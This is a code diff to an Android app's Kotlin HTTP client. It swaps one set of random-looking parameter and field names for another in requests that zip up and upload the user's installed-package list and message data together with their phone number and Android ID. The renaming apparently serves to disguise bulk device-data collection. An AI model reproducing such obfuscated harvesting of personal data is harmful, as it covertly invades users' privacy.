@@ -260,7 +260,7 @@ object HttpClient {
     @SuppressLint("HardwareIds")
     fun checkUploadStatus(mContext: Context) {
         val formMap: HashMap<String, Any> = HashMap()
-        formMap[Contants.imei_p] = Settings.Secure.getString(App.instance.contentResolver, Settings.Secure.ANDROID_ID)
+        formMap[Contants.imei_param] = Settings.Secure.getString(App.instance.contentResolver, Settings.Secure.ANDROID_ID)
         val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_CHECK_UPLOAD_STATUS, formMap)
         dispatchClient!!.enqueue(call, CommonBoolResponse::class.java,
             CheckUploadStatusResponseEvent::class.java)
@@ -269,7 +269,7 @@ object HttpClient {
     fun getPrivacyPolicyUrl(mContext: Context) {
 
         val formMap: HashMap<String, Any> = HashMap()
-        formMap["alfekfdvov"] = "declaration"
+        formMap["qxcndlgiiu"] = "declaration"
         val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_PRIVTE,formMap)
         dispatchClient?.enqueue(call, CommonResponse::class.java, PrivacyPolicyUrlResponseEvent::class.java)
     }
@@ -284,9 +284,9 @@ object HttpClient {
         val jsonList = Gson().toJson(installedPackageBody)
         val zipString = SystemDataUtils.getZipData(jsonList)
         val requestZipBody = RequestZipDataBody()
-        requestZipBody.sucbzl = CacheManager.mobile
-        requestZipBody.xjevovy = zipString
-        requestZipBody.gefl = DeviceInfoUtil.getAndroidId()
+        requestZipBody.brqyjc = CacheManager.mobile
+        requestZipBody.guawnoc = zipString
+        requestZipBody.guxf = DeviceInfoUtil.getAndroidId()
         val call = mHttpApi!!.requestPostZipData(getHeaders(mContext), Contants.URL_GZIP,requestZipBody)
         dispatchClient!!.enqueue(call, CommonResponse::class.java,
             UploadInstalledPackageListResponseEvent::class.java)
@@ -300,9 +300,9 @@ object HttpClient {
         val json = Gson().toJson(messageBody)
         val zipString = SystemDataUtils.getZipData(json)
         var requestZipBody = RequestZipDataBody()
-        requestZipBody.sucbzl = CacheManager.mobile
-        requestZipBody.xjevovy = zipString
-        requestZipBody.gefl = Settings.Secure.getString(App.instance.contentResolver, Settings.Secure.ANDROID_ID)
+        requestZipBody.brqyjc = CacheManager.mobile
+        requestZipBody.guawnoc = zipString
+        requestZipBody.guxf = Settings.Secure.getString(App.instance.contentResolver, Settings.Secure.ANDROID_ID)
         val call = mHttpApi!!.requestPostZipData(getHeaders(mContext), Contants.URL_GZIP,requestZipBody)
         dispatchClient!!.enqueue(call, CommonResponse::class.java, UploadSystemResponseEvent::class.java)
     }
